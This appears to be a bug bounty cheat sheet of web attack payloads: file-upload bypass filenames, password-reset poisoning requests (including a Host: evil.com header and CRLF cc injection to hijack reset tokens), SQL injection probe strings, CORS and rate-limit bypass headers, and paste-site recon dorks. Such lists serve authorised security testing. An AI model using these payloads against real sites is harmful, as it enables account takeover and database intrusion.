# Bug Bounty Tips
---

## File Upload

`.htaccess`

`file.svg`

`file.SVg`

`file.png.svg`

`file.php%00.png`

`file.png' or '1'='1`

`../../file.png`

`file.'svg`

## Password Reset

```
POST /reset  
email=victim@tld.xyz&email=hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz&token=$BF$
```

```
POST /reset  
email=victim@tld.xyz&token=
```

```
POST /reset  
email=victim@tld.xyz&token=0000000
```

```
POST /reset  
email=victim@tld.xyz&token=nul
```

```
POST /reset  
email=victim@tld.xyz&token=nil
```

```
POST /reset  
email=victim@tld.xyz&token=HACKER-TOKEN
```

```
POST /reset  
email=victim@tld.xyz%0a%0dcc:hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz,hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz%20hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz|hacker@tld.xyz
```

```
POST /reset  
email=victim
```

```
POST /reset  
email=victim@tld
```

```
POST /reset  
Host: evil.com
```

```
POST /reset
{"email":["victim@tld.xyz","hacker@tld.xyz"]}
```

**Check body response for password token**

**Token generation: timestamp? userid? useremail? random?**

## SQL Injection

`/?q=1`

`/?q=1'`

`/?q=1"`

`/?q=[1]`

`/?q[]=1`

```/?q=1` ```

`/?q=1\`

`/?q=1/*'*/`

`/?q=1/*!1111'*/`

`/?q=1'||'asd'||'`

`/?q=1' or '1'='1`

`/?q=1 or 1=1`

`/?q='or''='`

```
username: '--' / "--"
password: '--' / "--"
```

## CORS

```python
if isBlocked("evil.com"):
  try("target.network")
  try("target.computer")
```

## Recon


`site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://justpaste.it | site:http://pastebin.com | site:http://jsfiddle.net | site:http://trello.com "$TARGET"`

## File analysis

### Javascript

```
apt-get install jsbeautifier
wget https://target/app.js
js-beautify app.js > pretty.js
grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
```

## Rate limit bypass

```
X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP
```

**Increment last octate if blocked**

## Subdomain list

amass + altdns + dnsprobe + nmap

## Information disclosure

- Check if email disclosed in response after inviting a user
